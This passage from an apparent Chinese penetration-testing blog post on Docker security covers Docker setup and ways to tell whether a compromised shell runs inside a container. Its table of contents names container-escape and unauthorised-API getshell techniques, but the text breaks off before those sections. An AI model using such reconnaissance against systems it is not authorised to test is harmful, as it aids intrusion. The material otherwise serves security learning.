@@ -1,0 +1,1678 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Docker容器快速入门">
+<title>Docker安全攻防</title>
+
+<link rel='canonical' href='https://lserein.github.io/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="Docker安全攻防">
+<meta property='og:description' content="Docker容器快速入门">
+<meta property='og:url' content='https://lserein.github.io/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/'>
+<meta property='og:site_name' content='Lsec&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-01-14T16:49:21&#43;08:00'/><meta property='article:modified_time' content='2026-01-14T17:01:02&#43;08:00'/><meta property='og:image' content='https://lserein.github.io/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/logo.jpg' />
+<meta name="twitter:title" content="Docker安全攻防">
+<meta name="twitter:description" content="Docker容器快速入门"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://lserein.github.io/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/logo.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_huc83695a2748b8374c632d172527a7db7_35249_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Lsec&#39;s Blog</a></h1>
+            <h2 class="site-description">欢迎来到Lsec的博客</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Lserein/Lserein.github.io'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://x.com/secL15737016'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#1docker环境配置">1.Docker环境配置</a></li>
+    <li><a href="#2如何判断当前环境是否为容器环境">2.如何判断当前环境是否为容器环境</a>
+      <ol>
+        <li><a href="#21查询cgroup信息">2.1.查询cgroup信息</a></li>
+        <li><a href="#22检查dockerenv文件">2.2.<strong>检查/.dockerenv文件</strong></a></li>
+        <li><a href="#23检查挂载信息">2.3.检查挂载信息</a></li>
+        <li><a href="#24查看硬盘信息">2.4.<strong>查看硬盘信息</strong></a></li>
+      </ol>
+    </li>
+    <li><a href="#3容器逃逸">3.容器逃逸</a>
+      <ol>
+        <li><a href="#31特权模式">3.1.特权模式</a>
+          <ol>
+            <li><a href="#311如何判断容器是否为特权模式启动">3.1.1.如何判断容器是否为特权模式启动？</a></li>
+            <li><a href="#312容器逃逸">3.1.2.容器逃逸</a></li>
+          </ol>
+        </li>
+        <li><a href="#32危险挂载">3.2.危险挂载</a>
+          <ol>
+            <li><a href="#321挂载-docker-socket-逃逸">3.2.1.挂载 Docker Socket 逃逸</a></li>
+            <li><a href="#322挂载宿主机-procfs-逃逸">3.2.2.挂载宿主机 procfs 逃逸</a></li>
+          </ol>
+        </li>
+        <li><a href="#33docker-历史版本漏洞逃逸">3.3.Docker 历史版本漏洞逃逸</a>
+          <ol>
+            <li><a href="#331cve-2019-5736-runc逃逸鸡肋">3.3.1.CVE-2019-5736 RunC逃逸（鸡肋）</a></li>
+            <li><a href="#332cve-2020-15257-containerd逃逸">3.3.2.CVE-2020-15257 containerd逃逸</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#4docker常见漏洞">4.Docker常见漏洞</a>
+      <ol>
+        <li><a href="#41docker未授权漏洞">4.1.Docker未授权漏洞</a>
+          <ol>
+            <li><a href="#411查看版本接口">4.1.1.查看版本接口</a></li>
+            <li><a href="#412查看info目录">4.1.2.查看info目录</a></li>
+            <li><a href="#413查看image镜像">4.1.3.查看image镜像</a></li>
+            <li><a href="#414docker连接未授权端口">4.1.4.Docker连接未授权端口</a></li>
+            <li><a href="#415写公钥getshell">4.1.5.写公钥GetShell</a></li>
+          </ol>
+        </li>
+        <li><a href="#42docker容器逃逸漏洞">4.2.Docker容器逃逸漏洞</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/">
+                <img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/logo_hu6d0ba24a779dd05fe97fcd76787ec38f_7738_800x0_resize_q75_box.jpg"
+                        srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/logo_hu6d0ba24a779dd05fe97fcd76787ec38f_7738_800x0_resize_q75_box.jpg 800w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/logo_hu6d0ba24a779dd05fe97fcd76787ec38f_7738_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="501" 
+                        loading="lazy"
+                        alt="Featured image of post Docker安全攻防" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/web%E5%AE%89%E5%85%A8/" style="background-color: #2a9d8f; color: #fff;">
+                Web安全
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/">Docker安全攻防</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Docker容器快速入门
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jan 14, 2026</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 5 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="1docker环境配置">1.Docker环境配置
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">apt</span><span class="w"> </span><span class="n">install</span><span class="w"> </span><span class="n">docker</span><span class="p">.</span><span class="na">io</span><span class="w">      </span><span class="c1">//安装docker</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">systemctl</span><span class="w"> </span><span class="n">status</span><span class="w"> </span><span class="n">docker</span><span class="w">      </span><span class="c1">//查看docker状态</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">systemctl</span><span class="w"> </span><span class="n">start</span><span class="w"> </span><span class="n">docker</span><span class="w">        </span><span class="c1">//启动docker</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//配置镜像地址</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sudo</span><span class="w"> </span><span class="n">tee</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">daemon</span><span class="p">.</span><span class="na">json</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="err">&#39;</span><span class="n">EOF</span><span class="err">&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;registry-mirrors&#34;</span><span class="p">:</span><span class="w"> </span><span class="o">[</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;https://docker.1panel.live&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;https://hub.1panel.dev&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;https://docker.kejilion.pro&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;https://docker.xuanyuan.me&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;https://hubp.me&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;https://dockerproxy.net&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;https://hub2.nat.tf&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;https://doublezonline.cloud&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">EOF</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//重载并重启 Docker</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sudo</span><span class="w"> </span><span class="n">systemctl</span><span class="w"> </span><span class="n">daemon</span><span class="o">-</span><span class="n">reload</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sudo</span><span class="w"> </span><span class="n">systemctl</span><span class="w"> </span><span class="n">restart</span><span class="w"> </span><span class="n">docker</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//验证配置是否生效</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">docker</span><span class="w"> </span><span class="n">info</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">A</span><span class="w"> </span><span class="n">10</span><span class="w"> </span><span class="s">&#34;Registry Mirrors&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/1.png"
+	width="1186"
+	height="637"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/1_huf33dfa57f727f4d6aa0ba6e4177d6c76_173720_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/1_huf33dfa57f727f4d6aa0ba6e4177d6c76_173720_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="186"
+		data-flex-basis="446px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">docker</span><span class="w"> </span><span class="n">pull</span><span class="w"> </span><span class="n">xxx</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">docker</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">xxx</span><span class="w"> </span><span class="o">--</span><span class="n">privileged</span><span class="o">=</span><span class="kc">true</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="2如何判断当前环境是否为容器环境">2.如何判断当前环境是否为容器环境
+</h2><p><a class="link" href="https://www.cnblogs.com/xiaozi/p/17517237.html"  target="_blank" rel="noopener"
+    >https://www.cnblogs.com/xiaozi/p/17517237.html</a></p>
+<p>在渗透测试过程中，我们的起始攻击点可能在一台虚拟机里或是一个Docker环境里，甚至可能是在K8s集群环境的一个pod里，我们应该如何快速判断当前是否在容器环境中运行呢？</p>
+<p>当拿到shell权限，看到数字和字母随机生成的主机名大概率猜到在容器里了，查看进程，进程数很少，PID为1的进程为业务进程，这也是容器环境的典型特征。当然，以上这两种都是比较主观的判断。接下来，我们再来盘点下比较常用的几种检测方式。</p>
+<h3 id="21查询cgroup信息">2.1.查询cgroup信息
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">1</span><span class="o">/</span><span class="n">cgroup</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">qi</span><span class="w"> </span><span class="n">docker</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s">&#34;Is Docker&#34;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s">&#34;Not Docker&#34;</span><span class="w">       </span><span class="c1">//这个判断不一定可靠。现代 Docker（尤其是使用 cgroup v2 的系统）可能不会在 cgroup 路径中包含 &#34;docker&#34; 字样。</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/2.png"
+	width="537"
+	height="102"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/2_huab991dccd7405fc3d5a01ae395999868_5836_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/2_huab991dccd7405fc3d5a01ae395999868_5836_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="526"
+		data-flex-basis="1263px"
+	
+></p>
+<p>虚拟机环境输出如下</p>
+<p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/3.png"
+	width="1043"
+	height="347"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/3_hu81c638f0578d2c5ebe5091700a50e6d1_472074_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/3_hu81c638f0578d2c5ebe5091700a50e6d1_472074_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="300"
+		data-flex-basis="721px"
+	
+></p>
+<h3 id="22检查dockerenv文件">2.2.<strong>检查/.dockerenv文件</strong>
+</h3><p>通过判断根目录下的 .dockerenv文件是否存在，可以简单的识别docker环境。</p>
+<p>K8s&amp;docker环境下：<code>**ls -alh /.dockerenv**</code> 可以找到文件。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">[</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="o">/</span><span class="p">.</span><span class="na">dockerenv</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s">&#34;In Docker&#34;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s">&#34;Not in Docker&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/4.png"
+	width="555"
+	height="73"
+	srcset="/p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/4_hucb80f112c43689a93599d8e91abc00b3_3874_480x0_resize_box_3.png 480w, /p/docker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image/4_hucb80f112c43689a93599d8e91abc00b3_3874_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="760"
+		data-flex-basis="1824px"
+	
+></p>
+<h3 id="23检查挂载信息">2.3.检查挂载信息
+</h3><p><strong>mount | grep &lsquo;/ type&rsquo;</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">hackable</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="w"> </span><span class="o">&gt;</span><span class="w">  </span><span class="n">mount</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="err">&#39;</span><span class="o">/</span><span class="w"> </span><span class="n">type</span><span class="err">&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">overlay</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">type</span><span class="w"> </span><span class="nf">overlay</span><span class="w"> </span><span class="p">(</span><span class="n">rw</span><span class="p">,</span><span class="n">relatime</span><span class="p">,</span><span class="n">lowerdir</span><span class="o">=/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">l</span><span class="o">/</span><span class="n">XXIJBJHBTQR6LEVM34BN64XGTN</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">l</span><span class="o">/</span><span class="n">SUVY4U2KFMSLRP3VN5J6Z2W5AR</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">l</span><span class="o">/</span><span class="n">FCYYDN3GQV5CHTGX4SWMMY5D4F</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">l</span><span class="o">/</span><span class="n">2SXV4YFRSW7LIS5QDITN2FZUKU</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">l</span><span class="o">/</span><span class="n">2PQM3KWBS7FFAJTG5I4GHRNHOB</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">l</span><span class="o">/</span><span class="n">U74HQVKHQ3IZWFRDEC5X5QPB2A</span><span class="p">,</span><span class="n">upperdir</span><span class="o">=/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">8bcaf48c88b295de3361fb4eaa8b3be432ae09e480d6c24dfb1e2827dbe8ff6c</span><span class="o">/</span><span class="n">diff</span><span class="p">,</span><span class="n">workdir</span><span class="o">=/</span><span 